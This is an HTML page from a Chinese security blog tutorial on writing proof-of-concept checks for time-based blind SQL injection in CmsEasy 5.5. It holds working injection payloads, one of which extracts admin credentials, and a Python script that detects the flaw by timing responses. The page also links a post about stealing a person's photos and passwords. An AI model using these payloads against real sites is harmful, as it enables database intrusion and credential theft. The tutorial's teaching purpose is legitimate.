@@ -1,0 +1,759 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
+
+
+    <meta name="description" content="不是路人甲的闲人丁,娱乐型选手" />
+
+
+
+  <meta name="keywords" content="PoC," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
+
+
+<meta name="description" content="写在前面《PoC 编写指南》有 3 个月没更了，基本上我写博文都是在半夜两三点的时候写的，最近几个月有些忙，睡的也比较早，就一直停更了。当然也有一些别的方面的原因，每次写篇博文都是尽可能的把涉及到的东西讲清楚，写详细，自己在这个上面花的时间特别多，结果有些网站一个爬虫就全带走了，多多少少还是有些不爽，毕竟还是希望读者看过之后能给出一些宝贵的意见。
+再说积极的事，这个系列也帮助了一些人，其中有个兄弟">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 下篇)">
+<meta property="og:url" content="http://blog.evalbug.com/2016/04/17/poc_coding_4/index.html">
+<meta property="og:site_name" content="Medici.Yan's Blog">
+<meta property="og:description" content="写在前面《PoC 编写指南》有 3 个月没更了，基本上我写博文都是在半夜两三点的时候写的，最近几个月有些忙，睡的也比较早，就一直停更了。当然也有一些别的方面的原因，每次写篇博文都是尽可能的把涉及到的东西讲清楚，写详细，自己在这个上面花的时间特别多，结果有些网站一个爬虫就全带走了，多多少少还是有些不爽，毕竟还是希望读者看过之后能给出一些宝贵的意见。
+再说积极的事，这个系列也帮助了一些人，其中有个兄弟">
+<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-8.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-9.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-10.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-11.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-12.png">
+<meta property="og:updated_time" content="2016-04-17T18:19:53.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 下篇)">
+<meta name="twitter:description" content="写在前面《PoC 编写指南》有 3 个月没更了，基本上我写博文都是在半夜两三点的时候写的，最近几个月有些忙，睡的也比较早，就一直停更了。当然也有一些别的方面的原因，每次写篇博文都是尽可能的把涉及到的东西讲清楚，写详细，自己在这个上面花的时间特别多，结果有些网站一个爬虫就全带走了，多多少少还是有些不爽，毕竟还是希望读者看过之后能给出一些宝贵的意见。
+再说积极的事，这个系列也帮助了一些人，其中有个兄弟">
+<meta name="twitter:image" content="http://blog.evalbug.com/images/poc_coding_img/2-8.png">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 下篇) | Medici.Yan's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?35fe43c56e8a4a68a6a2ae899b9028fb";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        bp.src = '//push.zhanzhang.baidu.com/push.js';
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Medici.Yan's Blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br />
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-next-about"></i> <br />
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br />
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-next-categories"></i> <br />
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br />
+            归档
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <form class="site-search-form" >
+  <input type="text" id="ts-search-input" class="menu-search-input">
+</form>
+<script>
+  var option = {
+    engineKey: 'c9b47bfaa23404adf331'
+  };
+  (function(w,d,t,u,n,s,e){
+    s = d.createElement(t);
+    s.src = u;
+    s.async = 1;
+    w[n] = function(r){
+      w[n].opts = r;
+    };
+    e = d.getElementsByTagName(t)[0];
+    e.parentNode.insertBefore(s, e);
+  })(window,document,'script','//tinysou-cdn.b0.upaiyun.com/ts.js','_ts');
+  _ts(option);
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 下篇)
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2016-04-17T20:00:48+08:00" content="2016-04-17">
+            2016-04-17
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/PoC/" itemprop="url" rel="index">
+                  <span itemprop="name">PoC</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2016/04/17/poc_coding_4/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/04/17/poc_coding_4/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>《PoC 编写指南》有 3 个月没更了，基本上我写博文都是在半夜两三点的时候写的，最近几个月有些忙，睡的也比较早，就一直停更了。当然也有一些别的方面的原因，每次写篇博文都是尽可能的把涉及到的东西讲清楚，写详细，自己在这个上面花的时间特别多，结果有些网站一个爬虫就全带走了，多多少少还是有些不爽，毕竟还是希望读者看过之后能给出一些宝贵的意见。</p>
+<p>再说积极的事，这个系列也帮助了一些人，其中有个兄弟写了一个 Python 的项目，里面就用到了我们 2.3 节中的 PoC：</p>
+<p><a href="https://github.com/pythonfucku/app" target="_blank" rel="external">one python app for zoomeye 项目地址</a></p>
+<h2 id="2-4-基于时间的盲注的-SQL-注入-PoC-编写"><a href="#2-4-基于时间的盲注的-SQL-注入-PoC-编写" class="headerlink" title="2.4 基于时间的盲注的 SQL 注入 PoC 编写"></a>2.4 基于时间的盲注的 SQL 注入 PoC 编写</h2><p>本节原本打算找一个 PHP 语言的 CMS 的漏洞，环境好搭，找了半天没找到比较新的漏洞，最后决定直接用之前的漏洞。这次我们选择的漏洞为：</p>
+<p> <a href="http://wooyun.org/bugs/wooyun-2010-070827" target="_blank" rel="external">CmsEasy 5.5 UTF-8 20140802/celive/live/header.php SQL注入漏洞</a></p>
+<p> 这个漏洞是我们 2.2 节《基于报错的 SQL 注入 PoC 编写》中使用过的一个漏洞。</p>
+<p> 选这个洞的意义在于，让读者能体会到，一个漏洞的不同利用方式，没错，不只有一种利用方式。</p>
+<a id="more"></a>
+<p>基于时间的盲注一般是没办法通过回显来得到结果（包括 union 查询，报错回显），或者是没法通过有很明显的页面数据变化来确定 SQL 语句是否执行。这时候就可以通过页面的返回时间来确定是否成功执行了。</p>
+<p>这么说有些拗口，直接上实例。</p>
+<h3 id="2-4-1-漏洞分析"><a href="#2-4-1-漏洞分析" class="headerlink" title="2.4.1 漏洞分析"></a>2.4.1 漏洞分析</h3><p>具体分析可以直接看 2.2.1 小节，就不在这里浪费时间了。</p>
+<p>我们先来回顾一下这个漏洞在 2.2 节 的 Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求的链接：</span><br><span class="line"></span><br><span class="line">http://xxx.com/celive/live/header.php</span><br><span class="line"></span><br><span class="line">POST 数据内容：</span><br><span class="line"></span><br><span class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1&apos;,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(username,0x23,password) from cmseasy_user where groupid=2 limit 1))a from information_schema.tables group by a)b),&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;)#</span><br></pre></td></tr></table></figure>
+<p>这是一个典型的 group by 的报错 Payload。那么，这节是基于时间的盲注，我们就假装我们不能通过报错来拿到结果。所以我们修改 Payload 为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求的链接：</span><br><span class="line"></span><br><span class="line">http://xxx.com/celive/live/header.php</span><br><span class="line"></span><br><span class="line">POST 数据内容：</span><br><span class="line"></span><br><span class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1&apos;,(SELECT IF(1=1, sleep(5), &apos;1&apos;)),&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;)#</span><br></pre></td></tr></table></figure>
+<p>核心的 SQL 语句是这样的， <code>SELECT IF(1=1,sleep(5), &#39;1&#39;)</code> 熟悉 MySQL 语法的人应该知道这个意思，第一个参数是表达式，就是说如果表达式为真的话，就执行第二个参数位置的语名，在本例子中是 sleep 5秒，如果为假就执行第三个参数位置的语句，本例子中就是返回一个字符 1 。</p>
+<h3 id="2-4-2-漏洞复现"><a href="#2-4-2-漏洞复现" class="headerlink" title="2.4.2 漏洞复现"></a>2.4.2 漏洞复现</h3><p>实验所需 CMS 下载地址：<a href="http://pan.baidu.com/s/1i4lAwBF" target="_blank" rel="external"><font color="red">下载地址</font></a></p>
+<p>我们打开 Firefox 浏览器，开启 hackbar, 再打开开发者工具，调到网络选项卡，然后填写 Payload :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求的链接：</span><br><span class="line"></span><br><span class="line">http://localhost/cmseasy/celive/live/header.php</span><br><span class="line"></span><br><span class="line">POST 数据内容：</span><br><span class="line"></span><br><span class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1&apos;,(SELECT IF(1=1, sleep(5), &apos;1&apos;)),&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;)#</span><br></pre></td></tr></table></figure>
+<p>这个 Payload 会执行 sleep(5)，其执行结果如图 2－8 所示：</p>
+<p><img src="/images/poc_coding_img/2-8.png" alt="图 2-8"></p>
+<p>注意右下方的返回包时长，5068 ms。</p>
+<p>然后我们修改 IF 中的 1=1 为 1=2，此时肯定是不会执行 sleep(5) 的，然后我们观查一下返回时间：</p>
+<p><img src="/images/poc_coding_img/2-9.png" alt="图 2-9"></p>
+<p>注意右下方的返回时长，22 ms。</p>
+<p>除了返回时间以外，再注意看一下 图2-8 和 图2-9 这两张图中网页内容，发现是内容是一模一样的，现在能体会到什么是基于时间的盲注了吧？<strong>无法通过内容变化来区别是否执行了 SQL 语句，只能过过注入延时函数来让返回包时间变长来判断。</strong></p>
+<blockquote>
+<p>这里有必要来讲一下什么会这样，其实在服务端执行的时候一般都是按顺序执行的，在请求数据库查询之后，是一直在等待数据库返回的，如果数据库一直不返回，就一直等着呗，直到超时。</p>
+</blockquote>
+<h3 id="2-4-3-无框架-PoC-编写"><a href="#2-4-3-无框架-PoC-编写" class="headerlink" title="2.4.3 无框架 PoC 编写"></a>2.4.3 无框架 PoC 编写</h3><p>看完漏洞分析之后，聪明的朋友已经想到要怎么做了：</p>
+<blockquote>
+<p>我知道，我知道，直接用有延时的 Payload 打上去，然后看返回的时间是不是大于 5s 就行了。这样只用请求一次目标，效率杠杠滴。</p>
+</blockquote>
+<p>就你知道，就你聪明。一般情况下，我们访问一个网页，响应时长确实是少于 5s 的，但是呢，来吧，我们先来看一张图：</p>
+<p><img src="/images/poc_coding_img/2-10.png" alt="图2-10"></p>
+<p>看出什么了吗？看不出来才怪，我都给你标记出来了。我们直接访问 github.com 响应的时长是大于 5s 的，没错，如果按照第上面的思路来的话，对于一些访问比较慢的网站来说，这妥妥的误报啊。总结一下，影响响应时长的大概有这么几种：</p>
+<ol>
+<li>网络延迟 (比如你的目标是海外的什么什么站你懂得，或者是网络拥塞了啥的，堵车了嘛)</li>
+<li>服务器处理速度（脚本执行的速度，服务器软件处理速度）</li>
+</ol>
+<p>所以，我们要尽可能的排除这些客观的因素，做法就是访问目标两次，第一次是正常请求，记录下响应时间差 a，然后再带上 Payload 来请求一次，得到一个响应时间差 b，计算一下 b-a 的值是不是在 5s 左右。</p>
+<blockquote>
+<p>这时值得注意的是，如果我们传入的 Payload 是 sleep(5)，在判断的时候不一定是大于 5s 哟，基本上 b-a 的值大于 4s ~ 4.5s 就差不多了。请思考为什么要这么判断。</p>
+<p>再说一下，那个正常的请求，可以是带着一定不执行 sleep 的 Payload ，也可以是一次正常的请求。</p>
+</blockquote>
+<p>好了我们直接上代码吧,代码其实可以简洁一点。</p>
+<p><code>代码 2_4_1.py</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding:utf-8</span><br><span class="line">import urllib2</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def verify(url):</span><br><span class="line">    target = &quot;%s/celive/live/header.php&quot; % url</span><br><span class="line">    # 要发送的数据</span><br><span class="line">    post_data1 = &#123;</span><br><span class="line">        &apos;xajax&apos;: &apos;LiveMessage&apos;,</span><br><span class="line">        &apos;xajaxargs[0][name]&apos;: &quot;1&apos;,(SELECT IF(1=2, sleep(5), &apos;1&apos;)),&quot;</span><br><span class="line">                              &quot;&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    # 有延时的 Payload</span><br><span class="line">    post_data2 = &#123;</span><br><span class="line">        &apos;xajax&apos;: &apos;LiveMessage&apos;,</span><br><span class="line">        &apos;xajaxargs[0][name]&apos;: &quot;1&apos;,(SELECT IF(1=1, sleep(5), &apos;1&apos;)),&quot;</span><br><span class="line">                              &quot;&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;) #&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        # 记录开始请求的时间</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        # 发送 HTTP 请求</span><br><span class="line">        req = urllib2.Request(target, data=urllib.urlencode(post_data1))</span><br><span class="line">        urllib2.urlopen(req)</span><br><span class="line">        # 记录正常请求并收到响应的时间</span><br><span class="line">        end_time_1 = time.time()</span><br><span class="line">        req2 = urllib2.Request(target, data=urllib.urlencode(post_data2))</span><br><span class="line">        urllib2.urlopen(req2)</span><br><span class="line">        # 收到响应的时间</span><br><span class="line">        end_time_2 = time.time()</span><br><span class="line">        # 计算时间差</span><br><span class="line">        delta1 = end_time_1 - start_time</span><br><span class="line">        delta2 = end_time_2 - end_time_1</span><br><span class="line">        # print &quot;delta1: %s, delta2: %s&quot; % (str(delta1), str(delta2))</span><br><span class="line">        if (delta2 - delta1) &gt; 4:</span><br><span class="line">            print &quot;%s is vulnerable&quot; % target</span><br><span class="line">        else:</span><br><span class="line">            print &quot;%s is not vulnerable&quot; % target</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print &quot;Something happend...&quot;</span><br><span class="line">        print e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    args = sys.argv</span><br><span class="line">    url = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    if len(args) == 2:</span><br><span class="line">        url = args[1]</span><br><span class="line">        verify(url)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;Usage: python %s url&quot; % (args[0])</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>将上述代码保存为 <code>2_4_1.py</code> 然后执行 <code>python 2_4_1.py http://localhost/cmseasy/</code> ，看一下执行效果图（为了方便我把 delta 的值打印了出来）：</p>
+<p><img src="/images/poc_coding_img/2-11.png" alt="图 2-11"></p>
+<p>我们访问一个不存在该漏洞的站：</p>
+<p><img src="/images/poc_coding_img/2-12.png" alt="图 2-12"></p>
+<p>至此一个无框架的漏洞验证 PoC 就写完了。</p>
+<h3 id="2-4-4-基于-Bugscan-框架"><a href="#2-4-4-基于-Bugscan-框架" class="headerlink" title="2.4.4 基于 Bugscan 框架"></a>2.4.4 基于 Bugscan 框架</h3><p>等待更新中。。。</p>
+<h3 id="2-4-5-基于-Pocsuite-框架"><a href="#2-4-5-基于-Pocsuite-框架" class="headerlink" title="2.4.5 基于 Pocsuite 框架"></a>2.4.5 基于 Pocsuite 框架</h3><p>等待更新中。。。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结一下这节暂时学到的东西：</p>
+<ol>
+<li>基于时间的 SQL 盲注,一般通过比较响应时间差来判断是否执行延时 SQL 语句</li>
+<li>尽可能的排除一些外界因素的影响。</li>
+<li>基于时间的盲注误差是客观存在的。</li>
+</ol>
+<hr>
+<blockquote>
+<p>2016/04/18<br>基于 Bugscan 框架应该很简单，这里我先不写, 读者可以自己来实现一下。<br>至于 Pocsuite 框架，读者可以先行实现一下 verify 部分。<br>热心的读者可以自己写完后直接邮件发我。下周我再来更新。</p>
+</blockquote>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PoC/" rel="tag">#PoC</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/04/12/funny_things_152/" rel="next">进入妹子电脑偷照片和密码实录</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="2016/04/17/poc_coding_4/"
+                   data-title="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 下篇)" data-url="http://blog.evalbug.com/2016/04/17/poc_coding_4/">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Medici.Yan" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">Medici.Yan</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">不是路人甲的闲人丁,娱乐型选手</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">27</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-name">分类</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">24</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/medicean" target="_blank">Weibo</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/medicean" target="_blank">GitHub</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+            <p class="site-author-name">Friends</p>
+            
+              <span class="links-of-author-item">
+              <a href="http://antoor.github.io" target="_blank">蚁逅</a>
+              </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blog.l1n3.net" target="_blank">LinE</a>
+              </span>
+            
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-基于时间的盲注的-SQL-注入-PoC-编写"><span class="nav-number">2.</span> <span class="nav-text">2.4 基于时间的盲注的 SQL 注入 PoC 编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-1-漏洞分析"><span class="nav-number">2.1.</span> <span class="nav-text">2.4.1 漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-2-漏洞复现"><span class="nav-number">2.2.</span> <span class="nav-text">2.4.2 漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-3-无框架-PoC-编写"><span class="nav-number">2.3.</span> <span class="nav-text">2.4.3 无框架 PoC 编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-4-基于-Bugscan-框架"><span class="nav-number">2.4.</span> <span class="nav-text">2.4.4 基于 Bugscan 框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-5-基于-Pocsuite-框架"><span class="nav-number">2.5.</span> <span class="nav-text">2.4.5 基于 Pocsuite 框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">2.6.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; &nbsp;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Medici.Yan</span>
+</div>
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"medicean"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
